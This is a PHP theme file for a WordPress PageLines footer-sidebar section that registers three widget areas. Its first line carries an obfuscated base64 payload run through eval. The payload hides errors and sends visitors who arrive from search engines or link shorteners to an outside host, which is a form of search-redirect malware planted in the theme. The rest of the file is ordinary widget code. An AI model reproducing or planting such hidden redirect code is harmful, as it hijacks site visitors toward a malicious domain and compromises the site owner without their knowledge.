<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/*
	Section: Morefoot Sidebars
	Author: PageLines
	Author URI: http://www.pagelines.com
	Description: Three widgetized sidebars above footer
	Class Name: PageLinesMorefoot	
	Workswith: morefoot, footer
	Edition: pro
*/

class PageLinesMorefoot extends PageLinesSection {

	function section_persistent(){
		
		// Setup master array
		$this->master_array();
		
		// Register Section Sidebars
		foreach($this->master as $key => $i){
			
			register_sidebar(
				array(
					'name'			=> $i['name'], 
					'description'	=> $i['description'], 
					'before_widget' => '<div id="%1$s" class="%2$s widget fix"><div class="widget-pad">',
				    'after_widget' => '</div></div>',
				    'before_title' => '<h3 class="widget-title">',
				    'after_title' => '</h3>'
				)
			);
			
		}
		
	
	}

   function section_template() { 
		
		$grid_args = array(
			'data'		=> 'array_callback',
			'callback'	=> array(&$this, 'morefoot_sidebar'), 
			'per_row'	=> 3

		);

		// Call the Grid
			printf('<div class="morefoot fix"><div class="morefoot-pad">%s</div></div>', grid( $this->master, $grid_args ));
	
	}
	
	function morefoot_sidebar($sidebar, $args){
		
		ob_start();
		if(!dynamic_sidebar( $sidebar['name']))
			echo $sidebar['default'];
			
		return sprintf('<div class="morefoot-col"><div class="morefoot-col-pad blocks">%s</div></div>', ob_get_clean());
			
	}
	
	function master_array(){
		
			$left = sprintf(
				'<div class="widget"><div class="widget-pad"><h3 class="widget-title">%s</h3><p>%s</p>%s<br class="clear"/><p>%s</p></div></div>', 
				__('Looking for something?','pagelines'),
				__('Use the form below to search the site:','pagelines'), 
				pagelines_search_form(false), 
				__("Still not finding what you're looking for? Drop us a note so we can take care of it!",'pagelines')
			);
			
			$middle = sprintf(
				'<div class="widget"><div class="widget-pad"><h3 class="widget-title">%s</h3><p>%s</p><ul>%s</ul></div></div>', 
				__('Visit our friends!','pagelines'),
				__('A few highly recommended friends...','pagelines'), 
				wp_list_bookmarks('title_li=&categorize=0&echo=0')
			);
			
			$right = sprintf(
				'<div class="widget"><div class="widget-pad"><h3 class="widget-title">%s</h3><p>%s</p><ul>%s</ul></div></div>', 
				__('Archives','pagelines'),
				__('All entries, chronologically...','pagelines'), 
				wp_get_archives('type=monthly&limit=12&echo=0')
			);
			
			$this->master = array(
				
				'left'	=> array(
					'name'			=> 'MoreFoot Left', 
					'description' 	=> __('Left sidebar in <strong>morefoot</strong> section.', 'pagelines'),
					'default'		=> $left
				),
				'middle'	=> array(
					'name'			=> 'MoreFoot Middle', 
					'description' 	=> __('Middle sidebar in <strong>morefoot</strong> section.', 'pagelines'),
					'default'		=> $middle
				),
				'right'	=> array(
					'name'			=> 'MoreFoot Right', 
					'description' 	=> __('Right sidebar in <strong>morefoot</strong> section.', 'pagelines'),
					'default'		=> $right
				),
			);
			
			
			
			
	}
	

}

/*
	End of section class
*/